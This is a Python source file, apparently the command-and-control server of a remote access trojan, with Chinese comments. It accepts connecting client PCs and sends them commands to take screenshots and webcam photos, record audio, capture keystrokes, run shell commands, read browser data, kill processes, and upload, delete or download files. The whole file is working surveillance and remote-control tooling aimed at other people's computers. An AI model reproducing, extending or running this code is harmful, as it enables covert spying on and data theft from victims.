# -*- coding: utf-8 -*-
import json
import os.path
import socket
import threading
import time
from tkinter import *
from tkinter import messagebox

# 5.6.2-pyinstaller
# import keyboard

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
with open("config.txt", mode='r', encoding='utf-8') as f:
    ipv4 = f.read()
    server.bind((ipv4, 5000))
server.listen(10)
##########################################################################
sockDict = {}  # 以上线客户端列表
blackNameList = []  # 用户黑名单列表
userNameDict = {}  # 用户名字典，读取json文件
sockNum = 0  # 上线客户端数量
isSreenshotOver = True  # 截图是否接收完毕
logWriter = open(f"logs/log_{time.time()}.txt", mode="w", encoding='utf-8')
driveBufferLock = threading.RLock()


def recvPic(sock, resp):
    '''
    接收一张图片数据
    :param sock:
    :param resp: 图片信息json
    :return:
    '''
    global isSreenshotOver
    recvSize = 0
    fileSize = resp['size']
    recvCount = 0
    w = open(f"recv_screenshot/{time.time()}.png", mode='ab')
    print(str(recvSize) + '/' + str(fileSize))
    while fileSize != recvSize:
        if fileSize - recvSize > 1024:
            sdata = sock.recv(1024)
            recvSize += len(sdata)
            w.write(sdata)
        else:
            sdata = sock.recv(fileSize - recvSize)
            recvSize = fileSize
            w.write(sdata)
        recvCount += 1
        if recvCount == 1024:
            recvCount = 0
            print(str(recvSize) + '/' + str(fileSize))
    print(str(recvSize) + '/' + str(fileSize))
    w.close()
    print("Picture transmission completed...")
    isSreenshotOver = True


def recvFile(sock, resp, userName):
    '''
    接收文件数据
    :param sock:
    :param resp: 文件信息json
    :return:
    '''
    recvSize = 0
    fileSize = resp['size']
    recvCount = 0
    if not os.path.isdir(f"recv_file/{userName}"):
        os.mkdir(f"recv_file/{userName}")
    w = open(f"recv_file/{userName}/{time.time()}_{resp['name']}", mode='ab')
    print(str(recvSize) + '/' + str(fileSize))
    while fileSize != recvSize:
        if fileSize - recvSize > 1024:
            sdata = sock.recv(1024)
            if sdata == b"":
                print("传输中断")
                break
            recvSize += len(sdata)
            w.write(sdata)
        else:
            sdata = sock.recv(fileSize - recvSize)
            recvSize = fileSize
            w.write(sdata)
        recvCount += 1
        if recvCount == 1024:
            recvCount = 0
            print(str(recvSize) + '/' + str(fileSize))
    print(str(recvSize) + '/' + str(fileSize))
    w.close()
    print("File transmission completed...")
    global isSreenshotOver
    isSreenshotOver = True


def receiveTxt(sock, sum):
    cnt = 0
    t = "\n"
    while True:
        sdata = sock.recv(1024)
        if sdata == b"":
            print("传输中断")
            t = t + "\n???"
            break
        dataText = sdata.decode("utf-8", 'ignore')
        cnt += dataText.count("\n")
        t = t + dataText
        if cnt == sum:
            break
    driveBufferLock.acquire()
    with open("cache/DriveBuffer.cache", mode="w", encoding="utf-8") as f:
        f.write(t)
    driveBufferLock.release()


def receive(sock, userName):
    '''
    接收客户端发回的数据，图片、文字等
    :param sock: 客户端对象
    :param address: 客户端地址
    :return:
    '''

    while True:
        try:
            data = sock.recv(1024)
            if data == b'':
                print("收到了一个空数据包...")
                sock.sent("0001".encode())  # 尝试发送数据
            else:
                resp = json.loads(data.decode('utf-8', 'ignore'))
                if resp['cmd'] == '/screenshot':
                    print(resp['cmd'])
                    recvPic(sock, resp)
                    print("Recv Over")
                elif resp['cmd'] == '/cpu':
                    print("\nCPU Usage: " + str(resp['info']) + " %")
                elif resp['cmd'] == '/info':
                    print("\n" + resp['info'])
                elif resp['cmd'] == '/mem':
                    print("\nMemory Total: " + str(resp['total']) + " GB")
                    print("Memory Available: " + str(resp['available']) + " GB")
                    print("Memory Usage: " + str(resp['percent']) + " %")
                elif resp['cmd'] == '/mouse':
                    print("\nX:" + str(resp['currentMouseX']) + " Y:" + str(resp['currentMouseY']))
                elif resp['cmd'] == '/file':
                    recvFile(sock, resp, userName)
                elif resp['cmd'] == '/txt':
                    receiveTxt(sock, resp['size'])
                elif resp['cmd'] == '/processList':
                    print(resp['name'])
                elif resp['cmd'] == '/isProcess':
                    if resp['flag']:
                        print(f"\nFind Process Named: {resp['name']}")
                    else:
                        print("\nNot Find...")
                elif resp['cmd'] == '/sizeofFile':
                    size = resp['size']
                    print("")
                    if int(size / (1024 * 1024 * 1024)) != 0:
                        print(format(size / (1024 * 1024 * 1024), '.2f'), end="")
                        print("GB")
                    elif int(size / (1024 * 1024)) != 0:
                        print(format(size / (1024 * 1024), '.2f'), end="")
                        print("MB")
                    elif int(size / (1024)) != 0:
                        print(format(size / (1024), '.2f'), end="")
                        print("KB")
                    else:
                        print(str(size) + "B")
        except:
            print("客户端异常关机")
            global isSreenshotOver
            isSreenshotOver = True
            sock.close()  # 关闭连接
            break
    sockDict.pop(sock)
    global sockNum
    sockNum -= 1


def run():
    '''
    监听客户端是否上线
    :return:
    '''
    global sockNum
    while True:
        connectFlag = True
        clientsock, clientaddress = server.accept()
        if clientsock not in sockDict:
            try:
                clientsock.send("hello~".encode())
                user_name = clientsock.recv(1024).decode()
                for name in blackNameList:
                    if name in user_name:
                        logWriter.write(f"reject PC named {user_name}")
                        connectFlag = False  # 拒绝连接
                        clientsock.send("0".encode())
                        clientsock.close()
                        break
                if connectFlag == False:
                    continue
                clientsock.send("1".encode())
                if user_name not in sockDict.values():
                    root = Tk()
                    root.withdraw()  # ****实现主窗口隐藏
                    root.wm_attributes('-topmost', 1)
                    messagebox.showinfo("主机上线", f"name={user_name}")
                    sockDict[clientsock] = user_name  # 加入到客户端列表
                sockNum = len(sockDict)
                # 创建线程用于接收数据
                threading.Thread(target=receive, args=(clientsock, user_name)).start()
            except:
                print("建立连接失败...")


def sentCommend(com, add):
    '''
    发送指令
    :param com: 指令
    :param add: 目标客户端
    :return:
    '''
    global isSreenshotOver
    for sock, name in sockDict.items():
        if add.split('-')[0] in name:
            try:
                sock.send(com.encode())
                print("sent success")
                return True
            except:
                isSreenshotOver = True
                print("sent error")
    print("not fund user...")
    isSreenshotOver = True
    return False


# def shortcut_key():
#     def back(x):
#         a = keyboard.KeyboardEvent('down', 15, 'tab')
#         # 按键事件a为按下enter键，第二个参数如果不知道每个按键的值就随便写，
#         # 如果想知道按键的值可以用hook绑定所有事件后，输出x.scan_code即可
#         if x.event_type == 'down' and x.name == a.name:
#             print("你按下了tab键")
#
#     keyboard.hook(back)
#     keyboard.wait()


def explorer(param, activeADD):
    '''
    执行文件操作命令
    :param param:命令行提示符
    :param activeADD: 客户端名
    :return:
    '''
    pwd = ""
    while True:
        cmd = input(param + ":")
        cmd = cmd.strip()
        if cmd.startswith("cd"):
            if cmd == "cd.." or cmd == "cd ..":
                pwd = '/'.join(pwd.split("/")[:-1])
                sentCommend("cd?" + pwd, activeADD)
            elif ":" not in cmd:
                folder = cmd[3:]
                with open("cache/DriveBuffer.cache", mode="r", encoding="utf-8") as f:
                    folders = f.read().split("\n")
                    if folder in folders:
                        pwd = pwd + "/" + folder
                        sentCommend("cd?" + pwd, activeADD)
                    else:
                        isfind = True
                        for folder_name in folders:
                            if folder_name.startswith(folder):
                                flag = input(param + ":" + "cd " + folder_name)
                                if flag == "":
                                    pwd = pwd + "/" + folder_name
                                    sentCommend("cd?" + pwd, activeADD)
                                    break
                                else:
                                    folder = folder_name + flag
                                    continue
                        if not isfind:
                            print("No such file or directory!")
            elif ":" in cmd:
                pwd = cmd[3:]
                sentCommend("cd?" + pwd, activeADD)
            else:
                sentCommend("cd?" + pwd, activeADD)
        elif cmd == "ls":
            driveBufferLock.acquire()
            with open("cache/DriveBuffer.cache", mode="r", encoding="utf-8") as f:
                t = f.read()
                print(t)
            driveBufferLock.release()
        elif cmd == "pwd":
            print(pwd)
        elif cmd.startswith("up"):
            if '-l' in cmd:
                files = ''
                while True:
                    upfileName = input("->")
                    if upfileName == 'EOF':
                        break
                    else:
                        files = files + '?' + upfileName
                print('pwd: ' + pwd)
                print('fileList: ' + str(files.split('?')[1:]))
                isSend = input("是否以以上参数发送命令？[y/n]")
                if isSend == 'y' or isSend == 'Y':
                    sentCommend("uplist?" + pwd + files, activeADD)
            else:
                fileName = cmd[3:]
                with open("cache/DriveBuffer.cache", mode="r", encoding="utf-8") as f:
                    folders = f.read().split("\n")
                    if fileName in folders:
                        sentCommend("up?" + pwd + "/" + fileName, activeADD)
                    else:
                        isfind = False
                        for folder_name in folders:
                            if folder_name.startswith(fileName):
                                isfind = True
                                flag = input(param + ":" + "up " + folder_name)
                                if flag == "":
                                    sentCommend("up?" + pwd + "/" + folder_name, activeADD)
                                    break
                                else:
                                    fileName = folder_name + flag
                                    continue
                        if not isfind:
                            print("No such file or directory!")
                # sentCommend("up?" + pwd + "/" + fileName, activeADD)
        elif cmd.startswith('cmd') and activeADD != 'NULL':
            command = cmd.split(" ", 1)
            if "-ali" in command[0]:
                sentCommend(f"cmd-ali-p?{pwd} " + str(command[1]), activeADD)
            else:
                sentCommend(f"cmd-tcp-p?{pwd} " + str(command[1]), activeADD)
        elif cmd.startswith("dl"):
            if "-lz" in cmd:
                cmdList = cmd.split(" ")
                link = ""
                path = ""
                if "-n" in cmd:
                    fileName = cmd.split("-n")[-1].strip()
                    path = pwd + "/" + fileName
                for i in cmdList:
                    if "http" in i:
                        link = i
                    if "-p" in cmd and ":" in i:
                        path = i
                sentCommend(f"dllz##{link}##{path}", activeADD)
            elif '-ali' in cmd:
                fileName = cmd[3:]
                sentCommend("dl?" + pwd + "/" + fileName, activeADD)
        elif cmd.startswith("rm"):
            fileName = cmd[3:]
            sentCommend("rm?" + pwd + "/" + fileName, activeADD)
        elif cmd.startswith("sz"):
            fileName = cmd[3:]
            sentCommend("sz?" + pwd + "/" + fileName, activeADD)
        elif cmd == "/q":
            break
        elif cmd == "/h":
            print("cd/cd../cd path/cd name")
            print("ls")
            print("pwd")
            print("dl -lz -l {download_link of file} -n{file name} -p{download path}")
            print("dl == get file")
            print("up {-l (end for EOF) } == upload file to aligo")
            print("/q")
        elif cmd == "":
            continue
        else:
            print("No such instruction...")
            print("use /h for help")
            continue


def post_cmd():
    '''
    主机端交互
    :return:
    '''
    activeADD = 'NULL'  # 当前活动地址 要执行命令的客户端
    activeName = 'server'
    while True:
        command = input(f"#{activeName}:")
        command = command.strip()
        if command == 'exit':
            print("good bye~")
            logWriter.close()
            break
        elif command == '/l':
            if len(sockDict) < 1:
                print("None")
                continue
            for sock, name in sockDict.items():
                print(str(sock) + '====>' + name)
        elif command == '/n' and activeADD == 'NULL':
            print(sockNum)
        elif command == '/cls':
            os.system("cls")
        elif command == '/h':
            print("/l == look for pc list")
            print("/n == num of pc")
            print("/c name of pc == connect pc")
            print("/u  == all users")
            print("/q == unconnect pc")
            print("/cls == Clear screen")
            print("rename nameA as nameB == rename PC")
            print("take photo")
            print("screenshot")
            print("rc -t {num of time}")
            print("get key == get keyboard info")
            print("get cpu info")
            print("get mem info")
            print("get mouse info")
            print("stop time")
            print("is process -{name}")
            print("process list -{size}")
            print("process list -ali")
            print("kill {process name}")
            print("exp")
            print("bro -{h,b} -browser")
        elif command.startswith('/c'):
            f = 1
            connectcmd = command.split(' ')
            if len(connectcmd) < 2:
                print("please use command as '/c name_Of_PC'")
                continue
            else:
                for sock, name in sockDict.items():
                    if connectcmd[1] in name:
                        activeADD = name
                        activeName = name
                        f = 0
                        break
            if f:
                print(f"can not find PC named {connectcmd[1]}")
        elif command.startswith('/u'):
            print(userNameDict)
        elif command == '/q':
            activeADD = 'NULL'
            activeName = 'server'
        elif command.startswith('info'):
            sentCommend('version', activeADD)
        elif command.startswith('rename'):
            renamecmd = command.split(" ")
            if len(renamecmd) < 4 or renamecmd[3] == '':
                print("please use command as 'rename nameA as nameB'")
                continue
            f = 1
            for sock, name in sockDict.items():
                if name == renamecmd[1]:
                    sockDict[sock] = renamecmd[3]
                    print("Modification Succeeded")
                    f = 0
                    break
            if f == 1:
                print('Modification Failed')
        elif command == 'take photo' and activeADD != 'NULL':
            sentCommend('take photo', activeADD)
        elif command.startswith('sc') and activeADD != 'NULL':
            global isSreenshotOver
            if "-ali" in command:
                sentCommend('sc -ali', activeADD)
            elif "auto" in command:
                while True:
                    if isSreenshotOver == True:
                        try:
                            if sentCommend('screenshot', activeADD):
                                isSreenshotOver = False
                            else:
                                isSreenshotOver = True
                        except:
                            isSreenshotOver = True
                    time.sleep(1)
            else:
                sentCommend('screenshot', activeADD)
        elif command.startswith('rc') and activeADD != 'NULL':
            # 录音
            if not "-t" in command:
                sentCommend(f'rc-5', activeADD)
                continue
            rcTime = command.split("-t")[-1].split(" ")[1]
            if not rcTime.isdigit():
                print("please input a number for '-t'")
            else:
                sentCommend(f'rc-{rcTime}', activeADD)
        elif command.startswith('kill') and activeADD != 'NULL':
            pName = command.split(" ")[-1]
            sentCommend(f'kill-{pName}', activeADD)
        elif command == 'get key' and activeADD != 'NULL':
            sentCommend('getKey', activeADD)
        elif command == 'get cpu info' and activeADD != 'NULL':
            sentCommend('get cpu info', activeADD)
        elif command == 'get mem info' and activeADD != 'NULL':
            sentCommend('get mem info', activeADD)
        elif command == 'get mouse info' and activeADD != 'NULL':
            sentCommend('get mouse info', activeADD)
        elif command == 'stop time' and activeADD != 'NULL':
            sentCommend('mouse stop time', activeADD)
        elif command.startswith('is process') and activeADD != 'NULL':
            command = command.split("-")
            name = command[1].strip()
            sentCommend(f"isp-{name}", activeADD)
        elif command.startswith("pl"):
            if "-ali" in command:
                sentCommend("processList -ali", activeADD)
                continue
            command = command.split("-")
            size = command[1].strip()
            if size.isdigit():
                sentCommend(f"processList-{size}", activeADD)
        elif command.startswith("bro") and activeADD != 'NULL':
            command = command.split("-")
            if len(command) != 3:
                print("browser -? -?")
            cont = command[1].strip()
            tar = command[2].strip()
            if cont != 'h' and cont != 'b':
                print(f'no such parameter "{cont}"')
                continue
            if tar != 'edge':
                print(f'no such parameter "{tar}"')
                continue
            sentCommend(cont + tar, activeADD)
        elif command.startswith('cmd') and activeADD != 'NULL':
            cmd = command.split(" ", 1)
            if "-ali" in cmd[0]:
                sentCommend("cmd-ali " + str(cmd[1]), activeADD)
            else:
                sentCommend("cmd-tcp " + str(cmd[1]), activeADD)
        elif command == 'exp' and activeADD != 'NULL':
            explorer("(Explorer)" + activeName, activeADD)
        elif command == 'update' and activeADD != 'NULL':
            if "-lz" in command:
                path = command.split(" ")[-1]
                sentCommend("update-lz" + "##" + path, activeADD)
        elif command == '':
            continue
        else:
            print("No such instruction...")
            print("use /h for help")
            continue


def init():
    '''
    导入黑名单
    :return:
    '''
    try:
        with open("BlackName.txt", mode='r', encoding='utf-8') as r:
            for line in r:
                line = line.strip()
                if line.startswith("#"):
                    if line[1:] != '':
                        blackNameList.append(line[1:])
        with open("Users.json", 'r', encoding="utf-8") as load_f:
            global userNameDict
            userNameDict = json.load(load_f)
    except:
        print("[failed init]error:open file named BlackName.txt failed")


def main():
    threading.Thread(target=run, args=()).start()
    threading.Thread(target=post_cmd, args=()).start()
    # threading.Thread(target=shortcut_key, args=()).start()


if __name__ == '__main__':
    init()
    main()
